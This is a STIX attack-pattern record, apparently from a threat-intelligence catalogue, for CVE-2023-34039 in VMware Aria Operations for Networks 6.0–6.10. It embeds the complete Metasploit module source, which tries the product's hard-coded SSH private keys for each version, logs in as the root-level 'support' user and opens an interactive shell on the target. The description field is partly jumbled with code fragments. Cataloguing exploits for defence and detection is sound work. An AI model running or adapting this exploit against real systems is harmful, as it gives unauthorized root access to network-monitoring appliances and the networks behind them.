{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b021a771-aa22-420f-a9e0-3c36e8eb563a",
    "created": "2024-08-14T16:58:14.623079Z",
    "modified": "2024-08-14T16:58:14.623083Z",
    "name": "VMWare Aria Operations for Networks (vRealize Network Insight) SSH Private Key Exposure",
    "description": " VMWare Aria Operations for Networks (vRealize Network Insight) versions 6.0.0 through 6.10.0 do not randomize the SSH keys on virtual machine initialization. Since the key is easily retrievable, an attacker can use it to gain unauthorized remote access as the \"support\" (root) user.  'Platform' => 'unix' 'Arch' => ARCH_CMD 'Privileged' => true 'Targets' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/ssh/vmware_vrni_known_privkey.rb",
            "external_id": "vmware_vrni_known_privkey.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-34039"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/sinsinology/CVE-2023-34039"
        },
        {
            "source_name": "reference",
            "url": "https://summoning.team/blog/vmware-vrealize-network-insight-rce-cve-2023-34039/"
        },
        {
            "source_name": "reference",
            "url": "https://www.vmware.com/security/advisories/VMSA-2023-0018.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'net/ssh'\nrequire 'net/ssh/command_stream'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::SSH\n\n  Rank = ExcellentRanking\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => 'VMWare Aria Operations for Networks (vRealize Network Insight) SSH Private Key Exposure',\n          'Description' => %q{\n            VMWare Aria Operations for Networks (vRealize Network Insight) versions 6.0.0 through 6.10.0\n            do not randomize the SSH keys on virtual machine initialization. Since the key is easily\n            retrievable, an attacker can use it to gain unauthorized remote access as the \"support\" (root) user.\n          },\n          'Platform' => 'unix',\n          'Arch' => ARCH_CMD,\n          'Privileged' => true,\n          'Targets' => [\n            [ '6.0_platform', { 'key' => ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2023-34039', 'id_rsa_vnera_keypair_6.0.0_platform') } ],\n            [ '6.0_proxy', { 'key' => ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2023-34039', 'id_rsa_vnera_keypair_6.0.0_proxy') } ],\n            [ '6.1_platform', { 'key' => ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2023-34039', 'id_rsa_vnera_keypair_6.1.0_platform') } ],\n            [ '6.1_proxy', { 'key' => ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2023-34039', 'id_rsa_vnera_keypair_6.1.0_proxy') } ],\n            [ '6.2_collector', { 'key' => ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2023-34039', 'id_rsa_vnera_keypair_6.2.0_collector') } ],\n            [ '6.2_platform', { 'key' => ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2023-34039', 'id_rsa_vnera_keypair_6.2.0_platform') } ],\n            [ '6.3_collector', { 'key' => ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2023-34039', 'id_rsa_vnera_keypair_6.3.0_collector') } ],\n            [ '6.3_platform', { 'key' => ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2023-34039', 'id_rsa_vnera_keypair_6.3.0_platform') } ],\n            [ '6.4_collector', { 'key' => ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2023-34039', 'id_rsa_vnera_keypair_6.4.0_collector') } ],\n            [ '6.4_platform', { 'key' => ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2023-34039', 'id_rsa_vnera_keypair_6.4.0_platform') } ],\n            [ '6.5_collector', { 'key' => ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2023-34039', 'id_rsa_vnera_keypair_6.5.0_collector') } ],\n            [ '6.5_platform', { 'key' => ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2023-34039', 'id_rsa_vnera_keypair_6.5.0_platform') } ],\n            [ '6.6_collector', { 'key' => ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2023-34039', 'id_rsa_vnera_keypair_6.6.0_collector') } ],\n            [ '6.6_platform', { 'key' => ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2023-34039', 'id_rsa_vnera_keypair_6.6.0_platform') } ],\n            [ '6.7_collector', { 'key' => ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2023-34039', 'id_rsa_vnera_keypair_6.7.0_collector') } ],\n            [ '6.7_platform', { 'key' => ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2023-34039', 'id_rsa_vnera_keypair_6.7.0_platform') } ],\n            [ '6.8_collector', { 'key' => ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2023-34039', 'id_rsa_vnera_keypair_6.8.0_collector') } ],\n            [ '6.8_platform', { 'key' => ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2023-34039', 'id_rsa_vnera_keypair_6.8.0_platform') } ],\n            [ '6.9_collector', { 'key' => ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2023-34039', 'id_rsa_vnera_keypair_6.9.0_collector') } ],\n            [ '6.9_platform', { 'key' => ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2023-34039', 'id_rsa_vnera_keypair_6.9.0_platform') } ],\n            [ '6.10_collector', { 'key' => ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2023-34039', 'id_rsa_vnera_keypair_6.10.0_collector') } ],\n            [ '6.10_platform', { 'key' => ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2023-34039', 'id_rsa_vnera_keypair_6.10.0_platform') } ],\n            [\n              'All', {} # built later\n            ],\n          ],\n          'Payload' => {\n            'Compat' => {\n              'PayloadType' => 'cmd_interact',\n              'ConnectionType' => 'find'\n            }\n          },\n          'Author' => [\n            'h00die', # MSF module\n            'SinSinology', # PoC\n            'Harsh Jaiswal (@rootxharsh)', # Discovery\n            'Rahul Maini (@iamnoooob)' # Discovery\n          ],\n          'License' => MSF_LICENSE,\n          'References' => [\n            ['CVE', '2023-34039'],\n            ['URL', 'https://github.com/sinsinology/CVE-2023-34039'],\n            ['URL', 'https://summoning.team/blog/vmware-vrealize-network-insight-rce-cve-2023-34039/'],\n            ['URL', 'https://www.vmware.com/security/advisories/VMSA-2023-0018.html'],\n          ],\n          'DisclosureDate' => '2023-08-29',\n          'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/interact' },\n          'DefaultTarget' => 22,\n          'Notes' => {\n            'Stability' => [CRASH_SAFE],\n            'Reliability' => [REPEATABLE_SESSION],\n            'SideEffects' => [IOC_IN_LOGS]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        # Since we don't include Tcp, we have to register this manually\n        Opt::RHOST(),\n        Opt::RPORT(22)\n      ], self.class\n    )\n\n    register_advanced_options(\n      [\n        OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false]),\n        OptBool.new('STOP_ON_SUCCESS', [ false, 'Stop on successful login', true]),\n        OptInt.new('SSH_TIMEOUT', [ false, 'Specify the maximum time in seconds to negotiate a SSH session', 30])\n      ]\n    )\n  end\n\n  # helper methods that normally come from Tcp\n  def rhost\n    datastore['RHOST']\n  end\n\n  def rport\n    datastore['RPORT']\n  end\n\n  def do_login(user, key_data)\n    opt_hash = ssh_client_defaults.merge({\n      auth_methods: ['publickey'],\n      port: rport,\n      key_data: [ key_data ]\n    })\n    opt_hash.merge!(verbose: :debug) if datastore['SSH_DEBUG']\n    begin\n      ssh_socket = nil\n      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do\n        ssh_socket = Net::SSH.start(rhost, user, opt_hash)\n      end\n    rescue Rex::ConnectionError\n      print_error \"#{rhost}:#{rport} SSH - Unable to connect\"\n      return nil\n    rescue Net::SSH::Disconnect, ::EOFError\n      print_error \"#{rhost}:#{rport} SSH - Disconnected during negotiation\"\n      return nil\n    rescue ::Timeout::Error\n      print_error \"#{rhost}:#{rport} SSH - Timed out during negotiation\"\n      return nil\n    rescue Net::SSH::AuthenticationFailed\n      print_error \"#{rhost}:#{rport} SSH - Failed authentication\"\n      return nil\n    rescue Net::SSH::Exception => e\n      print_error \"#{rhost}:#{rport} SSH Error: #{e.class} : #{e.message}\"\n      return nil\n    end\n\n    if ssh_socket\n      # Create a new session from the socket, then close it.\n      conn = Net::SSH::CommandStream.new(ssh_socket)\n      ssh_socket = nil\n\n      return conn\n    end\n    nil\n  end\n\n  def exploit\n    if target.name == 'All'\n      keys = targets.filter_map { |t| t.opts['key'] if t.name != 'All' }\n    else\n      keys = [target.opts['key']]\n    end\n\n    keys.each do |key|\n      vprint_status(\"Attempting key: #{key}\")\n      key_data = File.read(key, mode: 'rb')\n      conn = do_login('support', key_data)\n      next unless conn\n\n      print_good \"#{rhost}:#{rport} - Successful login via support@#{rhost}:#{rport} and ssh key: #{key}\"\n      handler(conn.lsock)\n      break if datastore['STOP_ON_SUCCESS']\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2023-08-29"
}